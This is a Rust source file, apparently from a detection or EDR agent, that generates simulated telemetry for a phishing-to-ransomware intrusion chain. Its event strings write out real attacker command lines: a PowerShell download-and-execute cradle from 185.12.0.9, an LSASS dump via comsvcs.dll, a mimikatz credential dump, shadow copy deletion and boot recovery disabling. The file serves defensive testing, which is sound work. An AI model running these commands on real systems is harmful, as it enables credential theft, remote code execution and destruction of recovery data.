use crate::Event;

/// Chaine d'intrusion simulee, partagee par l'agent mono-poste et l'agent de
/// parc. Phishing Office -> PowerShell -> vol de secrets -> ransomware.
/// L'ordre importe pour la resolution d'ascendance dans l'arbre de processus.
pub fn attack_chain(host: &str) -> Vec<Event> {
    const STEPS: &[(u32, u32, &str, &str)] = &[
        (4000, 0, r"C:\Windows\explorer.exe", "explorer.exe"),
        (4100, 4000, r"C:\Program Files\Microsoft Office\winword.exe", "winword.exe /n facture.docm"),
        (
            4200, 4100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0A",
        ),
        (
            4300, 4200, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://185.12.0.9/a.ps1')",
        ),
        (
            4400, 4300, r"C:\Windows\System32\rundll32.exe",
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\temp\\lsass.dmp full",
        ),
        (4500, 4300, r"C:\temp\m.exe", "m.exe sekurlsa::logonpasswords exit"),
        (4550, 4300, r"C:\Windows\System32\whoami.exe", "whoami /all"),
        (
            4600, 4300, r"C:\Windows\System32\vssadmin.exe",
            "vssadmin.exe delete shadows /all /quiet",
        ),
        (
            4700, 4300, r"C:\Windows\System32\bcdedit.exe",
            "bcdedit /set {default} recoveryenabled no",
        ),
    ];

    let mut events: Vec<Event> = STEPS
        .iter()
        .map(|(pid, ppid, image, cmd)| {
            Event::process_start(host, *pid, *ppid, image, "").with_cmdline(cmd)
        })
        .collect();

    // Exfiltration / C2 : connexion vers un port de commande & controle.
    events.push(Event::network(
        host,
        4300,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "185.12.0.9",
        4444,
    ));

    // BYOVD : chargement d'un driver vulnerable pour neutraliser les defenses.
    events.push(Event::image_load(host, 4500, r"C:\temp\m.exe", r"C:\temp\RTCore64.sys"));

    // Rançongiciel : note de rançon puis chiffrement massif de fichiers.
    let locker = r"C:\temp\locker.exe";
    events.push(Event::file_write(
        host,
        4900,
        locker,
        r"C:\Users\admin\Documents\READ_ME_TO_DECRYPT.txt",
    ));
    for i in 0..22 {
        events.push(Event::file_write(
            host,
            4900,
            locker,
            &format!(r"C:\Users\admin\Documents\rapport_{i}.crypted"),
        ));
    }

    events
}
